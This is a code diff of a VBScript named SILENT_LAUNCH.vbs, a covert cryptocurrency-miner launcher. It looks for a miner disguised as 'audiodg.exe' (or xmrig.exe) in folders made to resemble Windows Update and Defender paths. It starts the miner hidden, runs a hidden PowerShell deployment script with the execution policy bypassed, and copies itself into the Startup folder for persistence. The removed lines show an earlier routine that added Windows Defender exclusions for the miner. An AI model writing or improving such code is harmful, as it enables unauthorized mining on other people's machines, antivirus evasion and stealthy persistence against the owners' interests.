@@ -1,53 +1,65 @@
 ' =====================================================================
-' SILENT_LAUNCH.vbs - Smart + Defender Exclusion Version
+' SILENT_LAUNCH.vbs - Auto-detect Miner Location Version
 ' =====================================================================
-' - Auto-finds DEPLOY_ULTIMATE.ps1 in the same folder
-' - Adds important folders to Windows Defender exclusions (needs Admin)
-' - If miner is missing → runs full deployment as Admin
-' - If miner exists → starts it silently
-' - Adds itself to Startup
+' Automatically searches common locations for audiodg.exe + config.json
 ' =====================================================================
 
 Option Explicit
 
 Dim WshShell, fso, minerFolder, minerExe, configFile
 Dim deployScript, vbsName, startupFolder, currentFolder
-Dim objWMIService, colProcesses, cmd
+Dim objWMIService, colProcesses
+Dim possibleFolders, folder, found
 
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' ===================== FIXED PATHS =====================
-minerFolder   = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
-minerExe      = minerFolder & "\audiodg.exe"
-configFile    = minerFolder & "\config.json"
-' =======================================================
+' ========== LIST OF POSSIBLE MINER LOCATIONS ==========
+possibleFolders = Array( _
+    "C:\ProgramData\Microsoft\Windows\WindowsUpdate", _
+    "C:\ProgramData\WindowsUpdater", _
+    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv", _
+    "C:\ProgramData\Microsoft\Network\Downloader", _
+    WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\PowerShell", _
+    WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Defender", _
+    WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates", _
+    WshShell.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdateCache" _
+)
 
-' Get current folder of this VBS
+' Get current folder of this VBS (for DEPLOY_ULTIMATE.ps1)
 currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)
 deployScript  = currentFolder & "\DEPLOY_ULTIMATE.ps1"
 
 vbsName       = "SILENT_LAUNCH.vbs"
 startupFolder = WshShell.SpecialFolders("Startup") & "\" & vbsName
 
-' ========== FUNCTION: Add Defender Exclusions ==========
-Sub AddDefenderExclusions()
-    ' This will only work if running elevated
-    cmd = "powershell.exe -ExecutionPolicy Bypass -Command """ & _
-          "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\WindowsUpdate' -Force; " & _
-          "Add-MpPreference -ExclusionPath '" & currentFolder & "' -Force; " & _
-          "Add-MpPreference -ExclusionProcess 'audiodg.exe' -Force; " & _
-          "Add-MpPreference -ExclusionProcess 'xmrig.exe' -Force"""
-    
-    WshShell.Run cmd, 0, True
-End Sub
+' ========== AUTO-DETECT MINER LOCATION ==========
+found = False
 
-' ========== CHECK IF MINER IS ALREADY INSTALLED ==========
-If fso.FileExists(minerExe) And fso.FileExists(configFile) Then
+For Each folder In possibleFolders
+    If fso.FolderExists(folder) Then
+        If fso.FileExists(folder & "\audiodg.exe") And fso.FileExists(folder & "\config.json") Then
+            minerFolder = folder
+            minerExe    = folder & "\audiodg.exe"
+            configFile  = folder & "\config.json"
+            found = True
+            Exit For
+        End If
+        ' Also check for normal xmrig.exe (fallback)
+        If fso.FileExists(folder & "\xmrig.exe") And fso.FileExists(folder & "\config.json") Then
+            minerFolder = folder
+            minerExe    = folder & "\xmrig.exe"
+            configFile  = folder & "\config.json"
+            found = True
+            Exit For
+        End If
+    End If
+Next
 
-    ' Miner exists → just start it if not running
+' ========== IF MINER FOUND → START IT ==========
+If found Then
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'audiodg.exe'")
+    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = '" & fso.GetFileName(minerExe) & "'")
 
     If colProcesses.Count = 0 Then
         Dim cmdLine
@@ -56,20 +68,13 @@ If fso.FileExists(minerExe) And fso.FileExists(configFile) Then
     End If
 
 Else
-    ' Miner is NOT installed
-
-    ' First try to add Defender exclusions (will need elevation)
-    On Error Resume Next
-    AddDefenderExclusions
-    On Error GoTo 0
-
-    ' Then run the full deployment script as Administrator
+    ' Miner not found → try to run DEPLOY_ULTIMATE.ps1
     If fso.FileExists(deployScript) Then
         WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & deployScript & """", 0, False
     End If
 End If
 
-' ========== ADD TO STARTUP FOLDER ==========
+' ========== ADD TO STARTUP ==========
 If Not fso.FileExists(startupFolder) Then
     On Error Resume Next
     fso.CopyFile WScript.ScriptFullName, startupFolder, True
